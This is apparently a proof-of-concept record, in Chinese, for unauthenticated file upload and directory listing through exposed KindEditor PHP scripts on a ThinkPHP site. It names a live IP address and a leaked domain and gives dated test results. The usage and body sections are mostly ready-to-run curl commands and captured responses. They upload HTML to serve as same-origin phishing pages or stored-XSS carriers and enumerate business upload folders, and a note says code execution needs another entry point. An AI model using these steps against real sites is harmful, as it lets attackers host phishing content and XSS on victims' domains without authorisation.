# ThinkPHP 站群 KindEditor PHP 版本 upload_json.php / file_manager_json.php 零鉴权上传 + 目录列举（可托管任意 HTML）

- **code**: thinkphp-站群-kindeditor-php-版本-upload_json.php-file_manager
- **kind**: poc
- **category**: file-upload
- **component**: KindEditor（PHP 版上传/文件管理脚本）
- **severity**: high
- **source**: self
- **verified**: 1
- **verified_note**: 2026-10-29 在 45.151.135.166 零 Cookie 实测：① GET /Public/main/js/kindeditor/php/file_manager_json.php → 200/1650B JSON，current_url=/Upload/、total_count=12（含 List、qrcode、vlive 等业务目录）；② POST upload_json.php?dir=image（multipart imgFile=probe604.jpg）→ 200/91B {"error":0,"url":"http://kjadmin.com/Upload/image/20261029/20261029025332_69694.jpg"}；③ GET 该 jpg → 200/12B image/jpeg 正文 MARKER604IMG；④ dir=file 上传 m604.html → 回读 200 text/html 正文 MARKER604HTML；⑤ 阴性对照：filename=*.php/.phtml/.php5/.pht/.PHP/.jpg.php → {"error":1,"message":"上传文件扩展名是不允许的扩展名。只允许gif,jpg,jpeg,png,bmp格式。"}；dir=../../App/Tpl/Home → "目录名不正确。"；file_manager path=../../../ → "Access is not allowed."；.jpg 内存放 PHP 后经 /Upload/...jpg/x.php 访问 → 404（该目录不解析 PHP）。
- **path**: pocs/thinkphp-站群-kindeditor-php-版本-upload_json.php-file_manager/poc.txt
- **tags**: kindeditor,thinkphp,未授权上传,存储型xss,文件管理
- **created_at**: 2026-10-28T18:59:25.294Z
- **engine**: 45.151.135.166 (https://45.151.135.166)

## 描述

KindEditor 原始 PHP 示例脚本直接暴露在生产站 /Public/main/js/kindeditor/php/ 下，upload_json.php 与 file_manager_json.php 均无鉴权（无 session/token 校验），可零凭证上传图片/文档/HTML 并按路径回读，可列举 /Upload/ 下业务目录；扩展名与目录名白名单有效，PHP 代码执行未打通。

## 用法

```
1) 探测：curl -k "https://TARGET/Public/main/js/kindeditor/php/file_manager_json.php"
   # 返回 {"current_url":"/Upload/","total_count":N,"file_list":[...]} 即为未鉴权
2) 上传图片：curl -k -F "imgFile=@x.jpg;type=image/jpeg" "https://TARGET/Public/main/js/kindeditor/php/upload_json.php?dir=image"
3) 上传 HTML（同源钓鱼/存储型 XSS 载体）：curl -k -F "imgFile=@x.html;type=text/html" "...upload_json.php?dir=file"
4) 回读返回 JSON 里的 url 验证落地。
注意：扩展名白名单（image: gif/jpg/jpeg/png/bmp；file: doc/docx/xls/xlsx/ppt/htm/html/txt/zip/rar/gz/bz2）；/Upload/ 不解析 PHP，需另找执行点。
```

## 正文

```
## 入口
- `POST /Public/main/js/kindeditor/php/upload_json.php?dir=image|file`
- `GET  /Public/main/js/kindeditor/php/file_manager_json.php`
- 无任何 Cookie/Token 校验；上传落点 `/Upload/<dir>/YYYYMMDD/<时间戳>_<随机>.ext`
- 上传回显里的 host 泄露站点配置域名（本例 `kjadmin.com`）

## 实测回显
```
POST ...?dir=image  multipart imgFile=@probe604.jpg;type=image/jpeg
→ 200/91B {"error":0,"url":"http://kjadmin.com/Upload/image/20261029/20261029025332_69694.jpg"}
GET  /Upload/image/20261029/20261029025332_69694.jpg → 200 image/jpeg 正文 MARKER604IMG
POST ...?dir=file   multipart imgFile=@m604.html;type=text/html
→ {"error":0,"url":"http://kjadmin.com/Upload/file/20261029/20261029025444_25468.html"} → 回读 200 text/html
GET  file_manager_json.php → {"current_url":"/Upload/","total_count":12,"file_list":[{"filename":"List"},{"filename":"qrcode"},{"filename":"vlive"}...]}
```

## 边界（已实测证否的部分）
- 扩展名白名单生效：`.php/.phtml/.php5/.pht/.PHP/.jpg.php` 全部 `error:1 扩展名是不允许的`
- 目录穿越被拦：`dir=../../App/Tpl/Home` → `目录名不正确。`；`file_manager path=../../../` → `Access is not allowed.`
- `/Upload/` 下不解析 PHP：`.jpg` 内嵌 PHP 后经 `...jpg/x.php` 访问 404

## 影响
任意人可在该站主域下托管任意 HTML（同源钓鱼页、存储型 XSS 载体）、落地图片/文档，并枚举业务上传目录（客户二维码、录像、开奖图等）。
```
